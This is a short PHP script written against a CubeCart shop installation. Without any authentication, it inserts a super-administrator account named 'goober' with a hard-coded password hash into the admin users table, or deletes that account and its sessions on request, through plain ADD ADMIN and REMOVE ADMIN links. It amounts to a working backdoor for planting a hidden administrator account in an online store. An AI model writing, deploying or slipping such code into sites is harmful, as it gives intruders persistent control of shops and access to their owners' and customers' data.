<?php 
 
 

include_once("includes/global.inc.php");
include_once("classes/db.inc.php");
$db = new db();

if (isset($_GET['add'])){
	
	$cc_versioning = 0;
	$AdminTable = $db->select("DESCRIBE `".$glob['dbprefix']."CubeCart_admin_users`");
	for($i=0;$i<count($AdminTable);$i++){if($AdminTable[$i]['Field'] == "failLevel"){$cc_versioning = 1;break;}}

	if($cc_versioning == 1) {
		$db->misc("INSERT INTO `".$glob['dbprefix']."CubeCart_admin_users` ( `adminId` , `name` , `username` , `password` , `email` , `noLogins` , `isSuper` , `notes` , `failLevel` , `blockTime` , `lastTime` )
VALUES (NULL , '', 'goober', 'fc0586aca6e42cffade83252446d0613' , '', '0', '1', NULL , '0', '0', '0')");
	} else {
		$db->misc("INSERT INTO `".$glob['dbprefix']."CubeCart_admin_users` ( `adminId` , `name` , `username` , `password` , `email` , `noLogins` , `isSuper` , `notes` )
VALUES (NULL , '', 'goober', 'fc0586aca6e42cffade83252446d0613' , '', '0', '1', NULL)");	
	}
	echo "Admin added<br><br><a href=\"admin/index.php\">admin</a><br><br>";
} elseif (isset($_GET['remove'])){
	$db->misc("DELETE FROM `".$glob['dbprefix']."CubeCart_admin_users` WHERE username = 'goober'");
	$db->misc("DELETE FROM `".$glob['dbprefix']."CubeCart_admin_sessions` WHERE username = 'goober'");
	
	echo "Admin removed<br><br>";
}
?>
<a href="?add">ADD ADMIN</a> <a href="?remove">REMOVE ADMIN</a>
